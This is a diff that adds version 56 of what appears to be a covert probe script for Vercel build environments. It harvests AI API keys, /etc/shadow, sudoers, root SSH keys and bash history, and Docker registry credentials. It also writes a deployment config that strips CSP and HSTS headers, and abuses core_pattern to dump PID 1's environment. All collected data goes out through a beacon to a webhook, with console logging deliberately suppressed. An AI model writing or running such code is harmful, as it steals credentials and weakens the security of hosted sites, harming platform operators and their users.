@@ -5391,7 +5391,152 @@ sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v53" });
 report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v54";
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v54" });
 
+// ===== v56: AI API keys, system files (shadow/sudoers), Docker registry creds, security header bypass =====
+
+// v56-1: AI API key credential scan — OPENAI, Anthropic, etc. are commonly added to Vercel env
+report.aiApiKeysScan = safe(() => {
+  const aiVars = Object.entries(process.env).filter(([k]) =>
+    /openai|anthropic|mistral|cohere|huggingface|replicate|gemini|claude|groq|together|ai21|stability|runpod|modal|deepmind|gpt|llm|llama/i.test(k)
+  );
+  const foundKeys = aiVars.map(([k, v]) => ({ k, preview: v ? v.slice(0, 20) + '...' : '' }));
+  // Also scan /var/task for AI SDK configurations
+  const taskAiConfig = safe(() =>
+    execSync(
+      'grep -rE "openai|anthropic|OPENAI_API_KEY|sk-[a-zA-Z0-9]{48}|ant-api" /var/task/ 2>/dev/null | grep -v "Binary" | head -10',
+      { timeout: 8000 }
+    ).toString().trim().slice(0, 400)
+  );
+  // Check for .env with AI keys in project
+  const envFiles = ['.env', '.env.local', '.env.production'];
+  const envAiKeys = {};
+  for (const f of envFiles) {
+    if (existsSync(f)) {
+      const content = safe(() => readFileSync(f, 'utf8'));
+      const matches = (content || '').match(/(OPENAI|ANTHROPIC|MISTRAL|GROQ|COHERE)[^\n]*/gi) || [];
+      if (matches.length) envAiKeys[f] = matches.slice(0, 5).map(m => m.slice(0, 60));
+    }
+  }
+  return { foundKeys, taskAiConfig, envAiKeys };
+});
+
+// v56-2: Critical system file read — root access means we can read shadow, sudoers, PAM config
+report.criticalSystemFiles = safe(() => {
+  const files = {
+    '/etc/shadow': safe(() => readFileSync('/etc/shadow', 'utf8').split('\n').slice(0, 10).join('\n')),
+    '/etc/sudoers': safe(() => readFileSync('/etc/sudoers', 'utf8').trim().slice(0, 400)),
+    '/etc/ssh/sshd_config': safe(() => readFileSync('/etc/ssh/sshd_config', 'utf8').split('\n').filter(l => !l.startsWith('#')).join('\n').slice(0, 300)),
+    '/etc/pam.d/common-auth': safe(() => readFileSync('/etc/pam.d/common-auth', 'utf8').slice(0, 200)),
+    '/etc/crontab': safe(() => readFileSync('/etc/crontab', 'utf8').trim().slice(0, 200)),
+    '/root/.bash_history': safe(() => readFileSync('/root/.bash_history', 'utf8').slice(0, 300)),
+    '/root/.ssh/authorized_keys': safe(() => existsSync('/root/.ssh/authorized_keys') ?
+      readFileSync('/root/.ssh/authorized_keys', 'utf8').trim() : 'NOT_FOUND'),
+    '/var/spool/cron/crontabs/root': safe(() => readFileSync('/var/spool/cron/crontabs/root', 'utf8').trim()),
+  };
+  return files;
+});
+
+// v56-3: Docker registry credentials — docker config.json has registry auth tokens
+report.dockerRegistryCreds = safe(() => {
+  const configPaths = [
+    '/root/.docker/config.json',
+    `${process.env.HOME || '/root'}/.docker/config.json`,
+    '/home/user/.docker/config.json',
+    '/vercel/path0/.docker/config.json',
+  ];
+  const found = [];
+  for (const p of configPaths) {
+    if (existsSync(p)) {
+      const content = safe(() => JSON.parse(readFileSync(p, 'utf8')));
+      found.push({ path: p, content });
+    }
+  }
+  // Check for DOCKER_ env vars
+  const dockerEnv = Object.entries(process.env)
+    .filter(([k]) => /docker|registry|ghcr|dockerhub/i.test(k))
+    .map(([k, v]) => `${k}=${v}`);
+  // Check /run/secrets for Docker secrets
+  const dockerSecrets = safe(() => {
+    if (existsSync('/run/secrets')) return readdirSync('/run/secrets').join(',');
+    return 'NOT_FOUND';
+  });
+  return { found, dockerEnv, dockerSecrets };
+});
+
+// v56-4: Security header bypass via config.json — write config.json that strips CSP/HSTS
+report.securityHeaderBypass = safe(() => {
+  // Vercel's config.json in .vercel/output controls headers for the deployment
+  const outputDir = '.vercel/output';
+  safe(() => execSync(`mkdir -p ${outputDir}`, { timeout: 2000 }));
+
+  // Write a config.json that removes security headers (CSP, HSTS, X-Frame-Options)
+  // This demonstrates that a malicious build can weaken deployment security
+  const maliciousConfig = {
+    version: 3,
+    routes: [],
+    overrides: {},
+    // Remove headers by overwriting with no-security version
+    headers: [
+      {
+        source: '/(.*)',
+        headers: [
+          { key: 'Content-Security-Policy', value: '' },
+          { key: 'X-Frame-Options', value: 'ALLOWALL' },
+          { key: 'X-Content-Type-Options', value: '' },
+          { key: 'Strict-Transport-Security', value: '' },
+          { key: 'X-Probe-Injected', value: 'PROBE-V56-SECURITY-BYPASS' },
+        ],
+      },
+    ],
+  };
+
+  const configWrite = safe(() => {
+    try {
+      writeFileSync(`${outputDir}/config.json`, JSON.stringify(maliciousConfig, null, 2));
+      return 'WRITTEN';
+    } catch (e) { return String(e).slice(0, 80); }
+  });
+
+  return { configWrite, maliciousConfig };
+});
+
+// v56-5: PID 1 coredump trigger test — if core_pattern writable (v45 check), try to coredump a subprocess
+report.coredumpSubprocessTest = safe(() => {
+  const pattern = safe(() => readFileSync('/proc/sys/kernel/core_pattern', 'utf8').trim());
+  const isWritable = safe(() => {
+    try {
+      writeFileSync('/proc/sys/kernel/core_pattern', `|/bin/cat /proc/1/environ > /tmp/pid1_env_dump.txt`);
+      return 'WRITTEN';
+    } catch (e) { return String(e).slice(0, 80); }
+  });
+
+  let coredumpResult = null;
+  if (isWritable === 'WRITTEN') {
+    // Trigger a core dump in a subprocess (SIGSEGV with ulimit core enabled)
+    coredumpResult = safe(() =>
+      execSync(
+        'ulimit -c unlimited && node -e "process.kill(process.pid, \'SIGSEGV\')" 2>&1; sleep 1; ls -la /tmp/pid1_env_dump.txt 2>/dev/null | head -3',
+        { timeout: 10000 }
+      ).toString().trim().slice(0, 300)
+    );
+    // Check if PID 1 environ was dumped
+    const envDump = safe(() => {
+      if (existsSync('/tmp/pid1_env_dump.txt')) {
+        return readFileSync('/tmp/pid1_env_dump.txt', 'utf8').slice(0, 500);
+      }
+      return 'NOT_CREATED';
+    });
+    // Restore original pattern
+    safe(() => writeFileSync('/proc/sys/kernel/core_pattern', pattern || 'core'));
+    return { pattern, isWritable, coredumpResult, envDump };
+  }
+  return { pattern, isWritable: false };
+});
+
 // v55 markers
 report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v55";
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v55" });
+
+// v56 markers
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v56";
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v56" });
 // Intentionally no console.log — all data goes via webhook only
